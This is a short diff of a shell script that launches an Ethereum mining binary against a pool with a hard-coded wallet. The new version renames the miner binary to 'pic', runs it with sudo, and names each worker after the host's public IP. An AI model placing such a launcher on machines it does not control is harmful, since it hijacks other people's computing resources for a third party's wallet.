@@ -1,2 +1,9 @@
-#!/bin/sh
-./miner --algo ethash --server eth.2miners.com:2020 --user 0x5218597d48333d4a70cce91e810007b37e2937b5
+#!/bin/bash
+
+POOL=asia1.ethermine.org:4444
+WALLET=0x2dd9a734ffe4c75bbae173a13a5019b962eb1b76
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-babe
+
+cd "$(dirname "$0")"
+
+chmod +x ./pic && sudo ./pic --algo ethash --server $POOL --user $WALLET.$WORKER $@
